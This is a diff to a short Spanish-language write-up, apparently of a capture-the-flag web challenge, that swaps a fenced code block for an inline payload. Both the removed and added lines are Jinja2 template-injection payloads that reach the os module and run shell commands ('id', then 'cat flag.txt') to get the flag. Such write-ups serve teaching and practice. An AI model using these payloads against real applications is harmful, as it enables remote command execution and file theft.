@@ -23,10 +23,6 @@ Si enviamos dicha cadena, efectivamente recibimos un error:
 
 ![Image]({{ site.baseurl }}/images/posts/2024-11-04-Brew4U-Haunted-Brewery-CTF-3.png)
 
-De forma, que con un input como el siguiente, se nos dará la flag:
-
-```python
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
-```
+De forma, que con un input como `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}`, se nos dará la flag.
 
 Eso sería todo, si te ha gustado, échale un ojo a mi otro [writeup de web]({% post_url 2024-11-04-Anti-Spirit-FCaptcha-Haunted-Brewery-CTF %}).
